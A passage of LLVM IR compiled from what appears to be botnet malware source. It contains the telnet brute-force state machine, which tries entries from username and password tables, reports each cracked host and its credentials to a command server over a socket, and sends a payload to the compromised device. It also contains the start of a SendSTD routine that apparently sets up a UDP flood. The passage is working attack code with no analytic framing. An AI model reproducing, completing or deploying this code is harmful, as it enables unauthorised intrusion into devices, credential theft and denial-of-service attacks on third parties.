  %385 = load i32, i32* %6, align 4
  %386 = sext i32 %385 to i64
  %387 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %386
  call void @reset_telstate(%struct.telstate_t* %387)
  br label %388

; <label>:388:                                    ; preds = %384, %374
  br label %836

; <label>:389:                                    ; preds = %89
  %390 = load i32, i32* %6, align 4
  %391 = sext i32 %390 to i64
  %392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %391
  %393 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %392, i32 0, i32 0
  %394 = load i32, i32* %393, align 16
  %395 = load i32, i32* %6, align 4
  %396 = sext i32 %395 to i64
  %397 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %396
  %398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %397, i32 0, i32 4
  %399 = load i8, i8* %398, align 2
  %400 = zext i8 %399 to i64
  %401 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_usernames, i64 0, i64 %400
  %402 = load i8*, i8** %401, align 8
  %403 = load i32, i32* %6, align 4
  %404 = sext i32 %403 to i64
  %405 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %404
  %406 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %405, i32 0, i32 4
  %407 = load i8, i8* %406, align 2
  %408 = zext i8 %407 to i64
  %409 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_usernames, i64 0, i64 %408
  %410 = load i8*, i8** %409, align 8
  %411 = call i64 @strlen(i8* %410) #9
  %412 = call i64 @send(i32 %394, i8* %402, i64 %411, i32 16384)
  %413 = icmp slt i64 %412, 0
  br i1 %413, label %414, label %418

; <label>:414:                                    ; preds = %389
  %415 = load i32, i32* %6, align 4
  %416 = sext i32 %415 to i64
  %417 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %416
  call void @reset_telstate(%struct.telstate_t* %417)
  br label %837

; <label>:418:                                    ; preds = %389
  %419 = load i32, i32* %6, align 4
  %420 = sext i32 %419 to i64
  %421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %420
  %422 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %421, i32 0, i32 0
  %423 = load i32, i32* %422, align 16
  %424 = call i64 @send(i32 %423, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.115, i32 0, i32 0), i64 2, i32 16384)
  %425 = icmp slt i64 %424, 0
  br i1 %425, label %426, label %430

; <label>:426:                                    ; preds = %418
  %427 = load i32, i32* %6, align 4
  %428 = sext i32 %427 to i64
  %429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %428
  call void @reset_telstate(%struct.telstate_t* %429)
  br label %837

; <label>:430:                                    ; preds = %418
  %431 = load i32, i32* %6, align 4
  %432 = sext i32 %431 to i64
  %433 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %432
  call void @advance_telstate(%struct.telstate_t* %433, i32 4)
  br label %836

; <label>:434:                                    ; preds = %89
  %435 = load i32, i32* %6, align 4
  %436 = sext i32 %435 to i64
  %437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %436
  %438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %437, i32 0, i32 0
  %439 = load i32, i32* %438, align 16
  %440 = load i32, i32* %3, align 4
  %441 = load i32, i32* %6, align 4
  %442 = sext i32 %441 to i64
  %443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %442
  %444 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %443, i32 0, i32 9
  %445 = load i8*, i8** %444, align 8
  %446 = call i32 @read_until_response(i32 %439, i32 %440, i8* %445, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i32 0, i32 0))
  %447 = icmp ne i32 %446, 0
  br i1 %447, label %448, label %471

; <label>:448:                                    ; preds = %434
  %449 = call i64 @time(i64* null) #5
  %450 = trunc i64 %449 to i32
  %451 = load i32, i32* %6, align 4
  %452 = sext i32 %451 to i64
  %453 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %452
  %454 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %453, i32 0, i32 7
  store i32 %450, i32* %454, align 16
  %455 = load i32, i32* %6, align 4
  %456 = sext i32 %455 to i64
  %457 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %456
  %458 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %457, i32 0, i32 9
  %459 = load i8*, i8** %458, align 8
  %460 = call i32 @contains_fail(i8* %459)
  %461 = icmp ne i32 %460, 0
  br i1 %461, label %462, label %466

; <label>:462:                                    ; preds = %448
  %463 = load i32, i32* %6, align 4
  %464 = sext i32 %463 to i64
  %465 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %464
  call void @advance_telstate(%struct.telstate_t* %465, i32 0)
  br label %470

; <label>:466:                                    ; preds = %448
  %467 = load i32, i32* %6, align 4
  %468 = sext i32 %467 to i64
  %469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %468
  call void @advance_telstate(%struct.telstate_t* %469, i32 5)
  br label %470

; <label>:470:                                    ; preds = %466, %462
  br label %837

; <label>:471:                                    ; preds = %434
  %472 = load i32, i32* %6, align 4
  %473 = sext i32 %472 to i64
  %474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %473
  %475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %474, i32 0, i32 7
  %476 = load i32, i32* %475, align 16
  %477 = add i32 %476, 7
  %478 = zext i32 %477 to i64
  %479 = call i64 @time(i64* null) #5
  %480 = icmp slt i64 %478, %479
  br i1 %480, label %481, label %485

; <label>:481:                                    ; preds = %471
  %482 = load i32, i32* %6, align 4
  %483 = sext i32 %482 to i64
  %484 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %483
  call void @reset_telstate(%struct.telstate_t* %484)
  br label %485

; <label>:485:                                    ; preds = %481, %471
  br label %836

; <label>:486:                                    ; preds = %89
  %487 = load i32, i32* %6, align 4
  %488 = sext i32 %487 to i64
  %489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %488
  %490 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %489, i32 0, i32 0
  %491 = load i32, i32* %490, align 16
  %492 = load i32, i32* %6, align 4
  %493 = sext i32 %492 to i64
  %494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %493
  %495 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %494, i32 0, i32 5
  %496 = load i8, i8* %495, align 1
  %497 = zext i8 %496 to i64
  %498 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_passwords, i64 0, i64 %497
  %499 = load i8*, i8** %498, align 8
  %500 = load i32, i32* %6, align 4
  %501 = sext i32 %500 to i64
  %502 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %501
  %503 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %502, i32 0, i32 5
  %504 = load i8, i8* %503, align 1
  %505 = zext i8 %504 to i64
  %506 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_passwords, i64 0, i64 %505
  %507 = load i8*, i8** %506, align 8
  %508 = call i64 @strlen(i8* %507) #9
  %509 = call i64 @send(i32 %491, i8* %499, i64 %508, i32 16384)
  %510 = icmp slt i64 %509, 0
  br i1 %510, label %511, label %515

; <label>:511:                                    ; preds = %486
  %512 = load i32, i32* %6, align 4
  %513 = sext i32 %512 to i64
  %514 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %513
  call void @reset_telstate(%struct.telstate_t* %514)
  br label %837

; <label>:515:                                    ; preds = %486
  %516 = load i32, i32* %6, align 4
  %517 = sext i32 %516 to i64
  %518 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %517
  %519 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %518, i32 0, i32 0
  %520 = load i32, i32* %519, align 16
  %521 = call i64 @send(i32 %520, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.115, i32 0, i32 0), i64 2, i32 16384)
  %522 = icmp slt i64 %521, 0
  br i1 %522, label %523, label %527

; <label>:523:                                    ; preds = %515
  %524 = load i32, i32* %6, align 4
  %525 = sext i32 %524 to i64
  %526 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %525
  call void @reset_telstate(%struct.telstate_t* %526)
  br label %837

; <label>:527:                                    ; preds = %515
  %528 = load i32, i32* %6, align 4
  %529 = sext i32 %528 to i64
  %530 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %529
  call void @advance_telstate(%struct.telstate_t* %530, i32 6)
  br label %836

; <label>:531:                                    ; preds = %89
  %532 = load i32, i32* %6, align 4
  %533 = sext i32 %532 to i64
  %534 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %533
  %535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %534, i32 0, i32 0
  %536 = load i32, i32* %535, align 16
  %537 = load i32, i32* %3, align 4
  %538 = load i32, i32* %6, align 4
  %539 = sext i32 %538 to i64
  %540 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %539
  %541 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %540, i32 0, i32 9
  %542 = load i8*, i8** %541, align 8
  %543 = call i32 @read_until_response(i32 %536, i32 %537, i8* %542, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %544 = icmp ne i32 %543, 0
  br i1 %544, label %545, label %616

; <label>:545:                                    ; preds = %531
  %546 = call i64 @time(i64* null) #5
  %547 = trunc i64 %546 to i32
  %548 = load i32, i32* %6, align 4
  %549 = sext i32 %548 to i64
  %550 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %549
  %551 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %550, i32 0, i32 7
  store i32 %547, i32* %551, align 16
  %552 = load i32, i32* %6, align 4
  %553 = sext i32 %552 to i64
  %554 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %553
  %555 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %554, i32 0, i32 9
  %556 = load i8*, i8** %555, align 8
  %557 = call i32 @contains_fail(i8* %556)
  %558 = icmp ne i32 %557, 0
  br i1 %558, label %559, label %563

; <label>:559:                                    ; preds = %545
  %560 = load i32, i32* %6, align 4
  %561 = sext i32 %560 to i64
  %562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %561
  call void @advance_telstate(%struct.telstate_t* %562, i32 0)
  br label %615

; <label>:563:                                    ; preds = %545
  %564 = load i32, i32* %6, align 4
  %565 = sext i32 %564 to i64
  %566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %565
  %567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %566, i32 0, i32 9
  %568 = load i8*, i8** %567, align 8
  %569 = call i32 @contains_success(i8* %568)
  %570 = icmp ne i32 %569, 0
  br i1 %570, label %571, label %610

; <label>:571:                                    ; preds = %563
  %572 = load i32, i32* %6, align 4
  %573 = sext i32 %572 to i64
  %574 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %573
  %575 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %574, i32 0, i32 3
  %576 = load i8, i8* %575, align 1
  %577 = zext i8 %576 to i32
  %578 = icmp eq i32 %577, 2
  br i1 %578, label %579, label %583

; <label>:579:                                    ; preds = %571
  %580 = load i32, i32* %6, align 4
  %581 = sext i32 %580 to i64
  %582 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %581
  call void @advance_telstate(%struct.telstate_t* %582, i32 7)
  br label %609

; <label>:583:                                    ; preds = %571
  %584 = load i32, i32* @mainCommSock, align 4
  %585 = load i32, i32* %6, align 4
  %586 = sext i32 %585 to i64
  %587 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %586
  %588 = call i8* @get_telstate_host(%struct.telstate_t* %587)
  %589 = load i32, i32* %6, align 4
  %590 = sext i32 %589 to i64
  %591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %590
  %592 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %591, i32 0, i32 4
  %593 = load i8, i8* %592, align 2
  %594 = zext i8 %593 to i64
  %595 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_usernames, i64 0, i64 %594
  %596 = load i8*, i8** %595, align 8
  %597 = load i32, i32* %6, align 4
  %598 = sext i32 %597 to i64
  %599 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %598
  %600 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %599, i32 0, i32 5
  %601 = load i8, i8* %600, align 1
  %602 = zext i8 %601 to i64
  %603 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_passwords, i64 0, i64 %602
  %604 = load i8*, i8** %603, align 8
  %605 = call i32 (i32, i8*, ...) @sockprintf(i32 %584, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.116, i32 0, i32 0), i8* %588, i8* %596, i8* %604)
  %606 = load i32, i32* %6, align 4
  %607 = sext i32 %606 to i64
  %608 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %607
  call void @advance_telstate(%struct.telstate_t* %608, i32 7)
  br label %609

; <label>:609:                                    ; preds = %583, %579
  br label %614

; <label>:610:                                    ; preds = %563
  %611 = load i32, i32* %6, align 4
  %612 = sext i32 %611 to i64
  %613 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %612
  call void @reset_telstate(%struct.telstate_t* %613)
  br label %614

; <label>:614:                                    ; preds = %610, %609
  br label %615

; <label>:615:                                    ; preds = %614, %559
  br label %837

; <label>:616:                                    ; preds = %531
  %617 = load i32, i32* %6, align 4
  %618 = sext i32 %617 to i64
  %619 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %618
  %620 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %619, i32 0, i32 7
  %621 = load i32, i32* %620, align 16
  %622 = add i32 %621, 7
  %623 = zext i32 %622 to i64
  %624 = call i64 @time(i64* null) #5
  %625 = icmp slt i64 %623, %624
  br i1 %625, label %626, label %630

; <label>:626:                                    ; preds = %616
  %627 = load i32, i32* %6, align 4
  %628 = sext i32 %627 to i64
  %629 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %628
  call void @reset_telstate(%struct.telstate_t* %629)
  br label %630

; <label>:630:                                    ; preds = %626, %616
  br label %836

; <label>:631:                                    ; preds = %89
  %632 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %633 = call i32 (i8*, i8*, ...) @sprintf(i8* %632, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.117, i32 0, i32 0), i8** getelementptr inbounds ([10 x i8*], [10 x i8*]* @tempdirs, i32 0, i32 0)) #5
  %634 = load i32, i32* %6, align 4
  %635 = sext i32 %634 to i64
  %636 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %635
  %637 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %636, i32 0, i32 0
  %638 = load i32, i32* %637, align 16
  %639 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %640 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %641 = call i64 @strlen(i8* %640) #9
  %642 = call i64 @send(i32 %638, i8* %639, i64 %641, i32 16384)
  %643 = icmp slt i64 %642, 0
  br i1 %643, label %644, label %648

; <label>:644:                                    ; preds = %631
  %645 = load i32, i32* %6, align 4
  %646 = sext i32 %645 to i64
  %647 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %646
  call void @reset_telstate(%struct.telstate_t* %647)
  br label %837

; <label>:648:                                    ; preds = %631
  %649 = call i32 (...) @RemoveTempDirs()
  %650 = load i32, i32* @mainCommSock, align 4
  %651 = load i32, i32* %6, align 4
  %652 = sext i32 %651 to i64
  %653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %652
  %654 = call i8* @get_telstate_host(%struct.telstate_t* %653)
  %655 = load i32, i32* %6, align 4
  %656 = sext i32 %655 to i64
  %657 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %656
  %658 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %657, i32 0, i32 4
  %659 = load i8, i8* %658, align 2
  %660 = zext i8 %659 to i64
  %661 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_usernames, i64 0, i64 %660
  %662 = load i8*, i8** %661, align 8
  %663 = load i32, i32* %6, align 4
  %664 = sext i32 %663 to i64
  %665 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %664
  %666 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %665, i32 0, i32 5
  %667 = load i8, i8* %666, align 1
  %668 = zext i8 %667 to i64
  %669 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_passwords, i64 0, i64 %668
  %670 = load i8*, i8** %669, align 8
  %671 = call i32 (i32, i8*, ...) @sockprintf(i32 %650, i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.118, i32 0, i32 0), i8* %654, i8* %662, i8* %670)
  %672 = load i32, i32* %6, align 4
  %673 = sext i32 %672 to i64
  %674 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %673
  call void @advance_telstate(%struct.telstate_t* %674, i32 8)
  br label %836

; <label>:675:                                    ; preds = %89
  %676 = call i64 @time(i64* null) #5
  %677 = trunc i64 %676 to i32
  %678 = load i32, i32* %6, align 4
  %679 = sext i32 %678 to i64
  %680 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %679
  %681 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %680, i32 0, i32 7
  store i32 %677, i32* %681, align 16
  %682 = load i32, i32* %6, align 4
  %683 = sext i32 %682 to i64
  %684 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %683
  %685 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %684, i32 0, i32 0
  %686 = load i32, i32* %685, align 16
  %687 = call i64 @send(i32 %686, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.119, i32 0, i32 0), i64 4, i32 16384)
  %688 = icmp slt i64 %687, 0
  br i1 %688, label %689, label %690

; <label>:689:                                    ; preds = %675
  br label %690

; <label>:690:                                    ; preds = %689, %675
  %691 = load i32, i32* %6, align 4
  %692 = sext i32 %691 to i64
  %693 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %692
  %694 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %693, i32 0, i32 0
  %695 = load i32, i32* %694, align 16
  %696 = call i64 @send(i32 %695, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.120, i32 0, i32 0), i64 7, i32 16384)
  %697 = icmp slt i64 %696, 0
  br i1 %697, label %698, label %699

; <label>:698:                                    ; preds = %690
  br label %699

; <label>:699:                                    ; preds = %698, %690
  %700 = load i32, i32* %6, align 4
  %701 = sext i32 %700 to i64
  %702 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %701
  %703 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %702, i32 0, i32 0
  %704 = load i32, i32* %703, align 16
  %705 = load i8*, i8** @payload, align 8
  %706 = load i8*, i8** @payload, align 8
  %707 = call i64 @strlen(i8* %706) #9
  %708 = call i64 @send(i32 %704, i8* %705, i64 %707, i32 16384)
  %709 = icmp slt i64 %708, 0
  br i1 %709, label %710, label %714

; <label>:710:                                    ; preds = %699
  %711 = load i32, i32* %6, align 4
  %712 = sext i32 %711 to i64
  %713 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %712
  call void @reset_telstate(%struct.telstate_t* %713)
  br label %837

; <label>:714:                                    ; preds = %699
  %715 = load i32, i32* @mainCommSock, align 4
  %716 = load i32, i32* %6, align 4
  %717 = sext i32 %716 to i64
  %718 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %717
  %719 = call i8* @get_telstate_host(%struct.telstate_t* %718)
  %720 = load i32, i32* %6, align 4
  %721 = sext i32 %720 to i64
  %722 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %721
  %723 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %722, i32 0, i32 4
  %724 = load i8, i8* %723, align 2
  %725 = zext i8 %724 to i64
  %726 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_usernames, i64 0, i64 %725
  %727 = load i8*, i8** %726, align 8
  %728 = load i32, i32* %6, align 4
  %729 = sext i32 %728 to i64
  %730 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %729
  %731 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %730, i32 0, i32 5
  %732 = load i8, i8* %731, align 1
  %733 = zext i8 %732 to i64
  %734 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_passwords, i64 0, i64 %733
  %735 = load i8*, i8** %734, align 8
  %736 = call i32 (i32, i8*, ...) @sockprintf(i32 %715, i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.121, i32 0, i32 0), i8* %719, i8* %727, i8* %735)
  %737 = load i32, i32* %6, align 4
  %738 = sext i32 %737 to i64
  %739 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %738
  %740 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %739, i32 0, i32 0
  %741 = load i32, i32* %740, align 16
  %742 = load i32, i32* %3, align 4
  %743 = load i32, i32* %6, align 4
  %744 = sext i32 %743 to i64
  %745 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %744
  %746 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %745, i32 0, i32 9
  %747 = load i8*, i8** %746, align 8
  %748 = call i32 @read_until_response(i32 %741, i32 %742, i8* %747, i32 1024, i8** bitcast ([10 x i8]* @.str.122 to i8**))
  %749 = icmp ne i32 %748, 0
  br i1 %749, label %750, label %790

; <label>:750:                                    ; preds = %714
  %751 = load i32, i32* %6, align 4
  %752 = sext i32 %751 to i64
  %753 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %752
  %754 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %753, i32 0, i32 9
  %755 = load i8*, i8** %754, align 8
  %756 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %755, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.123, i32 0, i32 0))
  %757 = icmp ne i32 %756, 0
  br i1 %757, label %758, label %789

; <label>:758:                                    ; preds = %750
  %759 = load i32, i32* %6, align 4
  %760 = sext i32 %759 to i64
  %761 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %760
  %762 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %761, i32 0, i32 3
  %763 = load i8, i8* %762, align 1
  %764 = zext i8 %763 to i32
  %765 = icmp ne i32 %764, 3
  br i1 %765, label %766, label %789

; <label>:766:                                    ; preds = %758
  %767 = load i32, i32* @mainCommSock, align 4
  %768 = load i32, i32* %6, align 4
  %769 = sext i32 %768 to i64
  %770 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %769
  %771 = call i8* @get_telstate_host(%struct.telstate_t* %770)
  %772 = load i32, i32* %6, align 4
  %773 = sext i32 %772 to i64
  %774 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %773
  %775 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %774, i32 0, i32 4
  %776 = load i8, i8* %775, align 2
  %777 = zext i8 %776 to i64
  %778 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_usernames, i64 0, i64 %777
  %779 = load i8*, i8** %778, align 8
  %780 = load i32, i32* %6, align 4
  %781 = sext i32 %780 to i64
  %782 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %781
  %783 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %782, i32 0, i32 5
  %784 = load i8, i8* %783, align 1
  %785 = zext i8 %784 to i64
  %786 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_passwords, i64 0, i64 %785
  %787 = load i8*, i8** %786, align 8
  %788 = call i32 (i32, i8*, ...) @sockprintf(i32 %767, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.124, i32 0, i32 0), i8* %771, i8* %779, i8* %787)
  br label %789

; <label>:789:                                    ; preds = %766, %758, %750
  br label %790

; <label>:790:                                    ; preds = %789, %714
  %791 = load i32, i32* %6, align 4
  %792 = sext i32 %791 to i64
  %793 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %792
  %794 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %793, i32 0, i32 7
  %795 = load i32, i32* %794, align 16
  %796 = add i32 %795, 45
  %797 = zext i32 %796 to i64
  %798 = call i64 @time(i64* null) #5
  %799 = icmp slt i64 %797, %798
  br i1 %799, label %800, label %835

; <label>:800:                                    ; preds = %790
  %801 = load i32, i32* %6, align 4
  %802 = sext i32 %801 to i64
  %803 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %802
  %804 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %803, i32 0, i32 3
  %805 = load i8, i8* %804, align 1
  %806 = zext i8 %805 to i32
  %807 = icmp ne i32 %806, 3
  br i1 %807, label %808, label %831

; <label>:808:                                    ; preds = %800
  %809 = load i32, i32* @mainCommSock, align 4
  %810 = load i32, i32* %6, align 4
  %811 = sext i32 %810 to i64
  %812 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %811
  %813 = call i8* @get_telstate_host(%struct.telstate_t* %812)
  %814 = load i32, i32* %6, align 4
  %815 = sext i32 %814 to i64
  %816 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %815
  %817 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %816, i32 0, i32 4
  %818 = load i8, i8* %817, align 2
  %819 = zext i8 %818 to i64
  %820 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_usernames, i64 0, i64 %819
  %821 = load i8*, i8** %820, align 8
  %822 = load i32, i32* %6, align 4
  %823 = sext i32 %822 to i64
  %824 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %823
  %825 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %824, i32 0, i32 5
  %826 = load i8, i8* %825, align 1
  %827 = zext i8 %826 to i64
  %828 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_passwords, i64 0, i64 %827
  %829 = load i8*, i8** %828, align 8
  %830 = call i32 (i32, i8*, ...) @sockprintf(i32 %809, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.125, i32 0, i32 0), i8* %813, i8* %821, i8* %829)
  br label %831

; <label>:831:                                    ; preds = %808, %800
  %832 = load i32, i32* %6, align 4
  %833 = sext i32 %832 to i64
  %834 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %833
  call void @reset_telstate(%struct.telstate_t* %834)
  br label %835

; <label>:835:                                    ; preds = %831, %790
  br label %836

; <label>:836:                                    ; preds = %835, %648, %630, %527, %485, %430, %388, %336, %231, %89
  br label %837

; <label>:837:                                    ; preds = %836, %710, %644, %615, %523, %511, %470, %426, %414, %373, %317, %313, %196, %165
  %838 = load i32, i32* %6, align 4
  %839 = add nsw i32 %838, 1
  store i32 %839, i32* %6, align 4
  br label %71

; <label>:840:                                    ; preds = %71
  br label %69
                                                  ; No predecessors!
  ret void
}

; Function Attrs: nounwind
declare i32 @getdtablesize() #3

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #5

; Function Attrs: nounwind
declare i64 @time(i64*) #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

declare i32 @RemoveTempDirs(...) #1

; Function Attrs: noinline nounwind uwtable
define void @SendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [26 x i8*], align 16
  %13 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %14 = call i32 @socket(i32 2, i32 2, i32 0) #5
  store i32 %14, i32* %7, align 4
  %15 = call i64 @time(i64* null) #5
  store i64 %15, i64* %8, align 8
  %16 = load i8*, i8** %4, align 8
  %17 = call %struct.hostent* @gethostbyname(i8* %16)
  store %struct.hostent* %17, %struct.hostent** %10, align 8
  %18 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 16, i32 4, i1 false)
  %19 = load %struct.hostent*, %struct.hostent** %10, align 8
  %20 = getelementptr inbounds %struct.hostent, %struct.hostent* %19, i32 0, i32 4
  %21 = load i8**, i8*** %20, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 0
  %23 = load i8*, i8** %22, align 8
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
